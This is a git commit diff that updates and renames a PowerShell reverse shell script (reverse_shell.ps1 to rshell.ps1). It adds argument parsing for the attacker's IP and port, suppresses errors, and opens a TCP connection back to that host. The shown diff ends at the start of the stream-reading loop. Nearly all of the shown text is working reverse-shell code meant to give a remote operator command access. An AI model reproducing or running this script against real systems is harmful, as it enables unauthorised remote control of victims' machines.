e2ff59c4a0b0663aa79edac8931817a3c7ad3f78
Mike Black <kingmikaelone@gmail.com>
2022-02-08 10:59:13 +0100

    Update and rename reverse_shell.ps1 to rshell.ps1

--- rshell.ps1
+++ rshell.ps1
@@ -1,4 +1,16 @@
-$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);
+
+## USE: .\rshell.ps1 IP PORT
+## EX: .\rshell.ps1 192.168.56.22 9090
+echo @'
+
+## USE .\rshell.ps1 [IP] [PORT]
+### EX: .\rshell.ps1 192.168.56.22 9090
+
+'@
+$ErrorActionPreference= 'silentlycontinue'
+$hostip = $args[0]
+[int]$port = $args[1]
+$client = New-Object System.Net.Sockets.TCPClient($hostip, $port);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
